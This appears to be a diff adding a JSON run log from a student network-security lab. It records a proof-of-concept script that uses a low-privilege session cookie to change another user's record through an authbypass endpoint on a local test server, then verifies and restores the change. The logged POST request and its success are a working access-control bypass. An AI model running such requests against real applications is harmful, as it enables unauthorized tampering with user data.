@@ -1,0 +1,30 @@
+{
+  "cmd": [
+    "C:\\Users\\12396\\.dsh\\dsh-runtimes\\dsh-primary-runtime\\dependencies\\python\\python.exe",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v2\\AUTH-001__2.py",
+    "--base-url",
+    "http://127.0.0.1:9080",
+    "--session-file",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\followup\\sessions\\gordonb_low.cookie",
+    "--test-user-id",
+    "6",
+    "--confirm-write"
+  ],
+  "started_at": "2026-10-20T14:41:51+08:00",
+  "returncode": 0,
+  "elapsed_seconds": 0.221,
+  "stdout": "[1] baseline read: user_id=6\r\n    HTTP 200\r\n    original values: {'first_name': 'Wp4', 'surname': 'Target'}\r\n[2] low-privilege update: POST http://127.0.0.1:9080/vulnerabilities/authbypass/change_user_details.php body={\"id\": \"6\", \"first_name\": \"audit-mark-6\", \"surname\": \"audit-mark-6\"}\r\n    HTTP 200, response: '{\"result\":\"ok\"}'\r\n[3] independent read-back\r\n    HTTP 200, record: {'user_id': '6', 'first_name': 'audit-mark-6', 'surname': 'audit-mark-6'}\r\n    harmless marker observed: yes\r\n[4] restore original values\r\n    HTTP 200, response: '{\"result\":\"ok\"}'\r\n    restore confirmed: yes\r\n",
+  "stderr": "",
+  "cohort": "v2",
+  "stem": "AUTH-001__2",
+  "poc": "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v2\\AUTH-001__2.py",
+  "args_redacted": [
+    "--base-url",
+    "http://127.0.0.1:9080",
+    "--session-file",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\followup\\sessions\\gordonb_low.cookie",
+    "--test-user-id",
+    "6",
+    "--confirm-write"
+  ]
+}
